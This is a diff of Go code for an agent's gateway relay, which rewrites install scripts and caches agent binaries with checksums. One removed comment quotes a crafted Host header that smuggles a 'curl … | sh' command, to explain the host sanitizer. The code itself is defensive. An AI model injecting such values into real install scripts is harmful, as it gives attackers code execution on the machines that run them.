@@ -23,11 +23,9 @@ import (
 // machines that can't reach the internet point their agents at this relay
 // instead of the cloud — only the gateway machine needs internet access.
 //
-// Install scripts (/install.sh, /install.ps1) are intercepted so the SERVER
-// address is rewritten to the relay's own address: internal machines fetch the
-// script through the relay and auto-configure with the relay as their server,
-// then download binaries and report metrics through the relay — zero manual
-// configuration needed.
+// Install scripts (/install.sh, /install.ps1) are intercepted so SERVER= and
+// embedded CONFIG_B64 point at the relay. Internal machines then download
+// binaries and report metrics through the relay.
 //
 // v5.4.1: relaySecret is an optional shared secret that the relay injects as
 // X-Relay-Secret on every proxied request. When configured on the upstream
@@ -39,31 +37,21 @@ func runRelay(listenAddr, upstream, relaySecret string) {
 	}
 
 	proxy := httputil.NewSingleHostReverseProxy(target)
-	// Flush promptly so streaming responses (terminal tx/rx, long-poll) feel real-time.
 	proxy.FlushInterval = 100 * time.Millisecond
-	// Custom transport with high MaxIdleConnsPerHost: the default transport keeps
-	// only 2 idle connections per host, which causes TCP churn when many internal
-	// agents report concurrently through the relay.
 	proxy.Transport = relayTransport
 
 	dlCache := newRelayDLCache(upstream, relaySecret)
 
 	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Intercept install scripts: rewrite SERVER to the relay's address so
-		// internal machines auto-configure to connect through the relay.
 		if r.URL.Path == "/install.sh" || r.URL.Path == "/install.ps1" {
-			serveRelayInstallScript(w, r, upstream)
+			serveRelayInstallScript(w, r, upstream, relaySecret)
 			return
 		}
-		// Intercept /dl/ downloads: cache the agent binary / plugins.zip on the
-		// gateway so a fleet install of N internal machines hits the cloud ONCE
-		// instead of N×7.5MB. Cache miss falls through to the normal proxy.
 		if r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/dl/") {
 			if dlCache.serve(w, r) {
 				return
 			}
 		}
-		// v5.4.1: inject shared secret for relay authentication
 		if relaySecret != "" {
 			r.Header.Set("X-Relay-Secret", relaySecret)
 		}
@@ -74,8 +62,6 @@ func runRelay(listenAddr, upstream, relaySecret string) {
 	slog.Info("║  AIOps Agent — 网关中继模式 (Relay)                    ║")
 	slog.Info("║  监听: " + listenAddr + "  上游: " + upstream + "  ║")
 	slog.Info("╚══════════════════════════════════════════════════════╝")
-	// Extract port for the install command hint: listenAddr may be ":8529",
-	// "0.0.0.0:8529", or "127.0.0.1:8529" — the hint should always show :<port>.
 	relayPort := listenAddr
 	if _, port, err := net.SplitHostPort(listenAddr); err == nil && port != "" {
 		relayPort = ":" + port
@@ -84,8 +70,6 @@ func runRelay(listenAddr, upstream, relaySecret string) {
 	}
 	slog.Info("内网机器安装命令", "cmd", "curl -fsSL http://<本机IP>"+relayPort+"/install.sh | sh")
 
-	// Warn when binding to all interfaces — the relay is reachable by anyone
-	// on the network. For internet-exposed gateways, bind to the internal IP.
 	if listenAddr == "" || strings.HasPrefix(listenAddr, ":") ||
 		strings.HasPrefix(listenAddr, "0.0.0.0:") {
 		slog.Warn("⚠ 监听地址绑定到所有网卡——如不需外部访问，建议用 --listen 192.168.x.x:8529 绑定到内网IP")
@@ -95,16 +79,12 @@ func runRelay(listenAddr, upstream, relaySecret string) {
 		Addr:              listenAddr,
 		Handler:           handler,
 		ReadHeaderTimeout: 10 * time.Second,
-		// No Read/Write timeout: terminal streams and long-polls need unbounded duration.
 	}
 	if err := srv.ListenAndServe(); err != nil {
 		log.Fatalf("Relay 启动失败: %v", err)
 	}
 }
 
-// relayTransport is the custom transport for the reverse proxy. It raises
-// MaxIdleConnsPerHost from the default 2 to 50 so concurrent internal agents
-// reuse pooled connections instead of churning TCP handshakes.
 var relayTransport = &http.Transport{
 	MaxIdleConns:        100,
 	MaxIdleConnsPerHost: 50,
@@ -116,43 +96,27 @@ var relayTransport = &http.Transport{
 	}).DialContext,
 }
 
-// relayClient is used for the one-shot install-script fetch (small response,
-// generated instantly — a 15s timeout is plenty).
-var relayClient = &http.Client{Timeout: 15 * time.Second}
+var relayClient = &http.Client{Timeout: 30 * time.Second}
 
-// serverLineRe matches the SERVER= / $Server = assignment line in install
-// scripts, so the relay can rewrite the URL to its own address regardless of
-// how the upstream rendered it (scheme, port, trailing slash, …).
 var serverLineRe = regexp.MustCompile(`((?:SERVER|\$Server)\s*=\s*")[^"]+(")`)
 
-// maxInstallScriptSize caps how much we read from the upstream when proxying
-// install scripts. Real scripts are < 8 KB; anything larger is suspicious.
-const maxInstallScriptSize = 256 * 1024
+// Install scripts embed a full commented config.example.yaml reference; 1 MiB is safe.
+const maxInstallScriptSize = 1 << 20
 
-// sanitizeHost strips any character that could break out of a shell
-// double-quoted string when the host is injected into an install script's
-// SERVER="..." line. Without this, a crafted Host header like
-// `x"; curl malware.sh | sh; echo "` would inject commands into the
-// script that an internal machine pipes to sh.
 func sanitizeHost(h string) string {
 	return strings.Map(func(r rune) rune {
 		switch {
 		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
 			return r
 		case r == '.' || r == ':' || r == '-' || r == '[' || r == ']':
-			return r // IP addresses, ports, IPv6 brackets, domain hyphens
+			return r
 		default:
 			return -1
 		}
 	}, h)
 }
 
-// serveRelayInstallScript proxies an install.sh / install.ps1 request to the
-// upstream cloud server, then rewrites the SERVER address in the response body
-// to the relay's own address (derived from the sanitized request Host header).
-// Internal machines thus auto-configure to connect through the relay.
-func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream string) {
-	// Build the upstream URL (upstream is already normalized without trailing slash).
+func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream, relaySecret string) {
 	upstreamURL := upstream + r.URL.Path
 	if r.URL.RawQuery != "" {
 		upstreamURL += "?" + r.URL.RawQuery
@@ -163,6 +127,9 @@ func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream st
 		http.Error(w, "Relay: 构建请求失败", http.StatusInternalServerError)
 		return
 	}
+	if relaySecret != "" {
+		req.Header.Set("X-Relay-Secret", relaySecret)
+	}
 
 	resp, err := relayClient.Do(req)
 	if err != nil {
@@ -171,29 +138,25 @@ func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream st
 	}
 	defer resp.Body.Close()
 
-	// Cap the body: install scripts are tiny; a megabyte response means the
-	// upstream is broken or malicious — don't buffer it all into memory.
 	body, err := io.ReadAll(io.LimitReader(resp.Body, maxInstallScriptSize))
 	if err != nil {
 		http.Error(w, "Relay: 读取安装脚本失败", http.StatusInternalServerError)
 		return
 	}
+	if len(body) >= maxInstallScriptSize {
+		http.Error(w, "Relay: 安装脚本过大", http.StatusBadGateway)
+		return
+	}
 
-	// Sanitize the Host header to prevent command injection via crafted Host.
-	// Only hostname/IP/port characters survive; quotes, semicolons, backticks
-	// etc. are stripped so they can never break out of the shell double-quoted
-	// assignment in the install script.
 	host := sanitizeHost(r.Host)
 	if host == "" {
 		http.Error(w, "Relay: 无效的 Host 头", http.StatusBadRequest)
 		return
 	}
 
-	// Rewrite SERVER="..." (and $Server = "...") to the relay's address.
 	relayURL := "http://" + host
-	rewritten := serverLineRe.ReplaceAllString(string(body), "${1}"+relayURL+"${2}")
+	rewritten := rewriteInstallScriptForRelay(string(body), relayURL)
 
-	// Copy content type + status.
 	if ct := resp.Header.Get("Content-Type"); ct != "" {
 		w.Header().Set("Content-Type", ct)
 	}
@@ -202,20 +165,14 @@ func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream st
 	_, _ = io.WriteString(w, rewritten)
 }
 
-// relayDLCacheTTL 是 /dl/ 缓存文件的新鲜期：期内直接从磁盘服务、不回源。装机通常是
-// 短时间内一批机器并发拉取，10 分钟足以让整批命中同一份缓存，又不至于让新版 agent
-// 长期拿不到（过期后单机回源刷新，上游的 ETag 让内容不变时只回 304）。
 const relayDLCacheTTL = 10 * time.Minute
 
-// relayDLCache caches /dl/ static artifacts (agent binaries, plugins.zip) on the
-// gateway. It collapses a fleet install into a single upstream fetch and serves
-// local copies with full Range support (http.ServeFile) for resumable downloads.
 type relayDLCache struct {
 	dir      string
 	upstream string
 	secret   string
 	mu       sync.Mutex
-	locks    map[string]*sync.Mutex // per-file lock: avoid thundering-herd on cold cache
+	locks    map[string]*sync.Mutex
 }
 
 func newRelayDLCache(upstream, secret string) *relayDLCache {
@@ -235,42 +192,94 @@ func (c *relayDLCache) lockFor(name string) *sync.Mutex {
 	return l
 }
 
-// serve returns true if it handled the request (from cache or a fresh fetch),
-// false to let the caller fall through to the normal reverse proxy.
+// pairKey collapses binary + .sha256 into one lock/generation so they cannot desync.
+func relayDLPairKey(name string) string {
+	return strings.TrimSuffix(name, ".sha256")
+}
+
 func (c *relayDLCache) serve(w http.ResponseWriter, r *http.Request) bool {
 	name := path.Base(r.URL.Path)
-	// Reject anything that isn't a plain filename (path traversal / directory).
 	if name == "" || name == "." || name == "/" || strings.ContainsAny(name, `/\`) {
 		return false
 	}
 	cf := filepath.Join(c.dir, name)
+	pair := relayDLPairKey(name)
 
-	// Fast path: fresh cache hit — serve straight from disk.
 	if fi, err := os.Stat(cf); err == nil && !fi.IsDir() && time.Since(fi.ModTime()) < relayDLCacheTTL {
-		http.ServeFile(w, r, cf)
-		return true
+		// Also require sibling .sha256 (or binary) to be fresh when both exist.
+		if c.pairFresh(pair) {
+			http.ServeFile(w, r, cf)
+			return true
+		}
 	}
 
-	// Slow path: fetch under a per-file lock so concurrent installers don't all
-	// hit the cloud. Re-check freshness after acquiring the lock.
-	lk := c.lockFor(name)
+	lk := c.lockFor(pair)
 	lk.Lock()
 	defer lk.Unlock()
-	if fi, err := os.Stat(cf); err == nil && !fi.IsDir() && time.Since(fi.ModTime()) < relayDLCacheTTL {
+	if fi, err := os.Stat(cf); err == nil && !fi.IsDir() && time.Since(fi.ModTime()) < relayDLCacheTTL && c.pairFresh(pair) {
 		http.ServeFile(w, r, cf)
 		return true
 	}
-	if err := c.fetch(r.URL.Path, cf); err != nil {
+	if err := c.fetchPair(pair); err != nil {
 		slog.Warn("Relay /dl 缓存回源失败，回退直连代理", "file", name, "err", err)
-		return false // fall through to proxy
+		return false
 	}
-	slog.Info("Relay /dl 缓存已刷新", "file", name)
+	slog.Info("Relay /dl 缓存已刷新", "pair", pair)
 	http.ServeFile(w, r, cf)
 	return true
 }
 
-// fetch downloads one artifact from the upstream server to a temp file, then
-// atomically renames it into place so a partial download never serves corrupt bytes.
+func (c *relayDLCache) pairFresh(pair string) bool {
+	bin := filepath.Join(c.dir, pair)
+	sum := bin + ".sha256"
+	fi1, err1 := os.Stat(bin)
+	fi2, err2 := os.Stat(sum)
+	if err1 != nil && err2 != nil {
+		return false
+	}
+	now := time.Now()
+	if err1 == nil && now.Sub(fi1.ModTime()) >= relayDLCacheTTL {
+		return false
+	}
+	if err2 == nil && now.Sub(fi2.ModTime()) >= relayDLCacheTTL {
+		return false
+	}
+	// If both exist, require mtimes within 30s (same generation).
+	if err1 == nil && err2 == nil {
+		d := fi1.ModTime().Sub(fi2.ModTime())
+		if d < 0 {
+			d = -d
+		}
+		if d > 30*time.Second {
+			return false
+		}
+	}
+	return true
+}
+
+func (c *relayDLCache) fetchPair(pair string) error {
+	// Always refresh binary + checksum together when either is requested.
+	paths := []string{"/dl/" + pair}
+	if !strings.HasSuffix(pair, ".sha256") && !strings.HasSuffix(pair, ".zip") {
+		paths = append(paths, "/dl/"+pair+".sha256")
+	}
+	var firstErr error
+	for _, p := range paths {
+		dst := filepath.Join(c.dir, path.Base(p))
+		if err := c.fetch(p, dst); err != nil {
+			if firstErr == nil {
+				firstErr = err
+			}
+			// .sha256 missing is non-fatal for plugins.zip etc.
+			if strings.HasSuffix(p, ".sha256") {
+				continue
+			}
+			return err
+		}
+	}
+	return firstErr
+}
+
 func (c *relayDLCache) fetch(urlPath, dst string) error {
 	req, err := http.NewRequest("GET", c.upstream+urlPath, nil)
 	if err != nil {
